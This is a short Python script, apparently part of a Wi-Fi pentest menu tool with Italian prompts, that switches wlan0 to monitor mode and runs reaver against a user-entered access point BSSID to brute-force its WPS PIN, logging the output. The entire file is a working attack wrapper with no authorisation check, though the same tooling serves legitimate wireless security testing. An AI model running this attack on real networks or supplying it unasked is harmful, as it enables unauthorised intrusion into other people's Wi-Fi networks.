#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPS attack using reaver.
"""

import os
import subprocess
import time
from datetime import datetime

LOG_FILE = "wifi_pen.log"

def log_message(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def main():
    log_message("=== WPS ATTACK START ===")
    print("\n⚠️  Richiede reaver installato e interfaccia monitor.\n")
    bssid = input("Inserisci BSSID dell'AP target: ").strip()
    if not bssid:
        print("BSSID non valido.")
        return

    if not os.system("which reaver > /dev/null 2>&1") == 0:
        print("reaver non trovato. Installa reaver.")
        log_message("reaver not found")
        return

    # Attiva monitor mode
    subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
    time.sleep(2)
    interface = "wlan0mon"

    cmd = ["reaver", "-i", interface, "-b", bssid, "-v"]
    log_message(f"Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        log_message(f"Return code: {result.returncode}")
        log_message("Output:\n" + result.stdout)
        if result.stderr:
            log_message("Stderr:\n" + result.stderr)
        print("\nAttacco WPS completato. Vedi log.")
    except subprocess.TimeoutExpired:
        log_message("Timeout (120s) - attacco interrotto")
        print("Timeout raggiunto.")
    except Exception as e:
        log_message(f"Exception: {e}")
        print(f"\nErrore: {e}")
    finally:
        subprocess.run(["airmon-ng", "stop", interface], capture_output=True)

    log_message("=== WPS ATTACK END ===")
    print("\nPremi ENTER per tornare al menu.")
    input()

if __name__ == "__main__":
    main()